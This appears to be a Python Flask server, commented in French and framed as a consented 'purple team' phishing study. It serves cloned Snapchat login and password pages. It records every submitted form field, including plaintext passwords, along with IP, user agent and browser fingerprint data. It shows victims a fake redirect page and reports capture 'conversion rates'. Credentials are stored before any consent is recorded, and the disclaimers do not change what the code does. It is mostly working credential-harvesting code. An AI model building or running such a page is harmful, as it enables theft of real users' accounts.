"""
Snapchat Login Page Cloner — Version Purple Team Lab
Clone UNIQUEMENT la page de login pour recherche consentie.
NE PAS UTILISER contre de vraies cibles sans autorisation.
"""

import os
import sys
import time
import hashlib
import sqlite3
import random
import string
import json
import secrets
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, render_template, redirect, url_for, jsonify, session

# ============================================================
# CONFIGURATION — MODIFIER SELON TON ENVIRONNEMENT
# ============================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG = {
    "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
    "SERVER_PORT": 5000,
    "USE_HTTPS": False,
    "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
    "SESSION_TTL_MINUTES": 60,
    "RANDOMIZE_DOMAINS": True,
    "ADMIN_KEY": "CHANGE_ME_SNAPCHAT_LAB_2024",
}

# ============================================================
# SÉCURITÉ — Les identifiants ne sont JAMAIS vérifiés
# contre de vrais services. C'est une page de capture UNIQUEMENT.
# ============================================================

app = Flask(__name__, template_folder=os.path.join(BASE_DIR, "templates"), static_folder=os.path.join(BASE_DIR, "static"))
app.secret_key = secrets.token_hex(32)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]


def init_database():
    """Initialise la base SQLite pour stocker les credentials capturés."""
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            participant_id TEXT NOT NULL,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            consent_given BOOLEAN DEFAULT 0,
            debriefed BOOLEAN DEFAULT 0,
            session_token TEXT,
            notes TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            browser_language TEXT,
            platform TEXT,
            time_on_page INTEGER,
            referrer TEXT,
            click_count INTEGER,
            step TEXT
        )
    ''')

    for col in ['screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']:
        try:
            c.execute(f"ALTER TABLE captured_credentials ADD COLUMN {col} TEXT")
        except:
            pass
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS experiment_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT NOT NULL,
            participant_id TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()


def generate_participant_id():
    """Génère un ID de participant anonyme."""
    return f"P{datetime.now().strftime('%Y%m%d')}-{secrets.token_hex(4).upper()}"


def log_event(event_type, participant_id=None, details=None):
    """Log tous les événements pour l'analyse."""
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "INSERT INTO experiment_log (event_type, participant_id, details) VALUES (?, ?, ?)",
        (event_type, participant_id, json.dumps(details) if details else None)
    )
    conn.commit()
    conn.close()


def capture_credentials(participant_id, username, password, session_token=None):
    """Capture les credentials avec métadonnées complètes."""
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    c.execute('''
        INSERT INTO captured_credentials 
        (participant_id, username, password, ip_address, user_agent, session_token)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (participant_id, username, password, ip_address, user_agent, session_token))
    
    conn.commit()
    conn.close()
    
    log_event("CAPTURE", participant_id, {
        "username_length": len(username),
        "password_length": len(password),
        "ip": ip_address,
        "ua": user_agent
    })
    
    return True


# ============================================================
# CONSENT API (appelé par la page de consentement JS)
# ============================================================

@app.route('/api/consent', methods=['POST'])
def record_consent():
    """Enregistre le consentement du participant."""
    data = request.get_json(force=True)
    participant_id = data.get('participant_id')
    if not participant_id:
        return jsonify({"error": "participant_id requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "UPDATE captured_credentials SET consent_given=1 WHERE participant_id=?",
        (participant_id,)
    )
    conn.commit()
    conn.close()
    log_event("CONSENT_GIVEN", participant_id)
    return jsonify({"status": "recorded", "id": participant_id})


# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    """Page d'accueil — consentement + instructions."""
    # Génère un ID de participant unique par session
    if 'participant_id' not in session:
        session['participant_id'] = generate_participant_id()
        log_event("SESSION_START", session['participant_id'])
    
    return render_template('index.html', 
                         participant_id=session['participant_id'])


@app.route('/login')
def login_page():
    """Page de login clonée — c'est la page de capture."""
    if 'participant_id' not in session:
        return redirect(url_for('index'))
    
    return render_template('login.html', 
                         participant_id=session['participant_id'])


@app.route('/password')
def password_page():
    """Étape 2 : page de mot de passe clonée."""
    if 'participant_id' not in session:
        return redirect(url_for('index'))
    return render_template('password.html',
                         participant_id=session['participant_id'])

@app.route('/login', methods=['POST'])
def handle_login():
    """Capture les soumissions de formulaire — NE VÉRIFIE PAS LES IDENTIFIANTS."""
    participant_id = request.form.get('participant_id') or session.get('participant_id')
    
    # Capture TOUS les champs du formulaire
    form_fields = dict(request.form)
    
    # Identification du champ 'username' ─ champs les plus courants
    username = (
        form_fields.get('username', '')
        or form_fields.get('email', '')
        or form_fields.get('accountIdentifier', '')
        or form_fields.get('account_identifier', '')
        or form_fields.get('login', '')
    )
    
    # Identification du champ 'password' ─ champs les plus courants
    password = (
        form_fields.get('password', '')
        or form_fields.get('passwd', '')
        or form_fields.get('pass', '')
        or form_fields.get('pwd', '')
    )
    
    # Capture tous les champs (même sans mot de passe)
    all_fields = {k: v for k, v in form_fields.items()
                  if k != 'participant_id'}
    
    # Log la tentative de connexion
    log_event("LOGIN_ATTEMPT", participant_id, {
        "username_provided": bool(username),
        "password_provided": bool(password),
        "username_length": len(username),
        "fields_count": len(all_fields),
        "field_names": list(all_fields.keys())
    })
    
    # Toujours capturer ce qui est soumis
    if username or all_fields:
        # On crée une représentation de la soumission
        credential_str = json.dumps(all_fields, ensure_ascii=False)
        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
        c = conn.cursor()
        c.execute('''
            INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, session_token, notes)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (participant_id,
              username or json.dumps(all_fields),
              password or '',
              request.remote_addr,
              request.headers.get('User-Agent', 'Unknown'),
              None,
              credential_str))
        conn.commit()
        conn.close()
        log_event("CAPTURE", participant_id, {
            "fields": list(all_fields.keys()),
            "username_length": len(username),
            "password_length": len(password),
        })
    
    # Redirection réaliste
    return render_template('redirect.html', 
                         message="Connexion. Redirection...",
                         delay=2)


@app.route('/api/report')
def get_stats():
    """API pour récupérer les statistiques (pour l'analyse)."""
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    
    # Nombre total de captures
    c.execute("SELECT COUNT(*) FROM captured_credentials")
    total = c.fetchone()[0]
    
    # Taux de conversion (qui a soumis un formulaire vs qui a cliqué)
    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
    sessions = c.fetchone()[0]
    
    conversion_rate = (total / sessions * 100) if sessions > 0 else 0
    
    # Captures par jour
    c.execute('''
        SELECT DATE(timestamp), COUNT(*) FROM captured_credentials 
        GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7
    ''')
    daily = c.fetchall()
    
    conn.close()
    
    return jsonify({
        "total_sessions": sessions,
        "total_captures": total,
        "conversion_rate_pct": round(conversion_rate, 2),
        "daily_stats": [{"date": d, "count": c} for d, c in daily]
    })



@app.route('/shutdown', methods=['POST'])
def shutdown():
    os._exit(0)

@app.route('/api/dbcheck', methods=['GET'])
def dbcheck():
    """Vérifie l'état de la base depuis le processus serveur."""
    db_path = CONFIG["CAPTURE_DB"]
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        total = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        logs = c.execute("SELECT COUNT(*) FROM experiment_log").fetchone()[0]
        conn.close()
        return jsonify({
            "db_path": db_path,
            "db_exists": os.path.exists(db_path),
            "total_captures": total,
            "total_logs": logs
        })
    except Exception as e:
        return jsonify({"db_path": db_path, "error": str(e)}), 500


@app.route('/api/capture', methods=['POST'])
def api_capture():
    """Endpoint appelé par le script de capture."""
    db_path = CONFIG["CAPTURE_DB"]
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            data = request.form.to_dict()
        
        participant_id = data.get('participant_id') or request.cookies.get('participant_id', '')
        username = data.get('accountIdentifier', data.get('username', ''))
        password = data.get('password', '')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', 'Unknown')
        
        print(f"\n[CAPTURE] DB={db_path}", flush=True)
        print(f"[CAPTURE] pid={participant_id} user={username} step={data.get('step','?')}", flush=True)
        print(f"[CAPTURE] fingerprint: scr={data.get('screen_resolution','')} tz={data.get('timezone','')}", flush=True)
        
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        c.execute(
            """INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, 
             screen_resolution, timezone, browser_language, platform, 
             time_on_page, referrer, click_count, step, notes)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                participant_id, username, password, ip, ua,
                data.get('screen_resolution', ''),
                data.get('timezone', ''),
                data.get('browser_language', ''),
                data.get('platform', ''),
                data.get('time_on_page', 0),
                data.get('referrer', ''),
                data.get('click_count', 0),
                data.get('step', 'login'),
                json.dumps({k: v for k, v in data.items() if k not in ['participant_id', 'accountIdentifier', 'username', 'password', 'screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']}, ensure_ascii=False)
            )
        )
        conn.commit()
        
        after = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        print(f"[CAPTURE] inserted OK, total rows now: {after}", flush=True)
        
        conn.close()
        
        log_event("CAPTURE_API", participant_id, {
            "username_length": len(username),
            "password_length": len(password),
            "step": data.get('step', 'login'),
            "fingerprint": bool(data.get('screen_resolution'))
        })
        
        return jsonify({"ok": True, "captured": bool(username or password)})
    except Exception as e:
        print(f"[CAPTURE] ERROR: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


def require_admin():
    key = request.args.get('key') or request.headers.get('X-Admin-Key', '')
    if key != CONFIG["ADMIN_KEY"]:
        return jsonify({"error": "forbidden", "message": "Clé admin invalide. Passez ?key=CHANGE_ME_SNAPCHAT_LAB_2024"}), 403
    return None

@app.route('/v2/<path:subpath>')
@app.route('/v2/')
def v2_catchall(subpath=''):
    """Redirige les routes /v2/* (ex: /v2/captcha) vers le vrai Snapchat."""
    forbid = require_admin()
    if forbid:
        return forbid
    return redirect(f'https://accounts.snapchat.com/v2/{subpath}' if subpath else 'https://accounts.snapchat.com/v2/')

@app.route('/reset')
def reset_data():
    """Réinitialise les données (pour un nouveau test). Nécessite ?key=ADMIN_KEY."""
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute("DELETE FROM captured_credentials")
    c.execute("DELETE FROM experiment_log")
    conn.commit()
    conn.close()
    log_event("RESET", "admin")
    return "Données réinitialisées"


@app.route('/export')
def export_data():
    """Export des données anonymisées pour analyse. Nécessite ?key=ADMIN_KEY."""
    forbid = require_admin()
    if forbid:
        return forbid
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    
    c.execute('''
        SELECT participant_id, username, password, ip_address, 
               user_agent, timestamp, consent_given, debriefed 
        FROM captured_credentials
    ''')
    
    rows = c.fetchall()
    conn.close()
    
    export_data = []
    for row in rows:
        export_data.append({
            "participant_id": row[0],
            "username_length": len(row[1]) if row[1] else 0,
            "password_length": len(row[2]) if row[2] else 0,
            "ip": row[3],
            "user_agent": row[4],
            "timestamp": row[5],
            "consent": row[6],
            "debriefed": row[7]
        })
    
    return jsonify(export_data)


# ============================================================
# INITIALISATION
# ============================================================

if __name__ == '__main__':
    init_database()
    
    print(f"DB path: {CONFIG['CAPTURE_DB']}")
    print(f"DB exists: {os.path.exists(CONFIG['CAPTURE_DB'])}")
    
    try:
        print("""
╔══════════════════════════════════════════════════════════════════╗
║   SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique       ║
╠══════════════════════════════════════════════════════════════════╣
║   Objet    Etude de reaction au phishing (consentement req.)    ║
║   Cadre    Recherche ethique - Donnees anonymisees              ║
║   Interdit Toute utilisation non autorisee                      ║
╠══════════════════════════════════════════════════════════════════╣
║   Page d'accueil           http://localhost:5000                ║
║   Dashboard stats          http://localhost:5000/api/report     ║
║   API consentement         http://localhost:5000/api/consent    ║
║   Export anonymise         http://localhost:5000/export         ║
║   Reset base               http://localhost:5000/reset          ║
║   DB check                 http://localhost:5000/api/dbcheck    ║
╠══════════════════════════════════════════════════════════════════╣
║  Lancement :   python generate.py   (clone Snapchat)            ║
║  Demarrer :    python main.py                                   ║
╚══════════════════════════════════════════════════════════════════╝
        """)
    except UnicodeEncodeError:
        print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
        print(f"Server: http://localhost:{CONFIG['SERVER_PORT']}")
    
    app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"], 
            ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
            threaded=True)
